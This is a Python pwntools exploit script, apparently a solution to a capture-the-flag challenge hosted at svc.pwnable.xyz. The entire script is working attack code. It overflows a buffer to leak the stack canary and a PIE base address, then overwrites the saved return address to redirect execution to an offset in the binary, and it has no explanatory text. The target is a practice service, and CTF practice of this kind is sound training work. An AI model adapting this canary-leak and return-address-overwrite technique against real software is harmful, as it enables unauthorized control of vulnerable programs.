#!/usr/bin/python 
from pwn import *

#context.log_level = 'debug'
#p = process("./challenge")
p = remote("svc.pwnable.xyz", 30027)
#gdb.attach(p)

while True:
    p.recvuntil("\n")
    pay = 'A'*0x68 + 'B'
    p.sendafter("you > ", pay)
    p.recvuntil('B')
    canary = u64("\x00" + p.recv(7))
    break

log.info("canary : "+hex(canary))

while True:
    p.recvuntil("me  > ")
    me = p.recvuntil("\n")
    pay = 'A'*0x77 + 'B'  # s(0x68) + canary(0x8) + sfp(0x8) + ret
    if len(me) >= len(pay):
        p.sendafter("you > ", pay)
        p.recvuntil('B')
        pie = u64(p.recv(6)+ "\x00\x00") - 0x1081
        break
    else:
        p.sendafter("you > ", 'D')

log.info("pie : "+hex(pie))
while True:
    p.recvuntil("me  > ")
    me = p.recvuntil("\n")
    pay = 'A'*0x68 + p64(canary) + p64(0) + p64(pie+0xd30)
    if len(me) >= len(pay):
        p.sendafter("you > ", pay)
        break
    else:
        p.sendafter("you > ", 'D')

p.sendafter("you > ", "exit")

p.interactive()
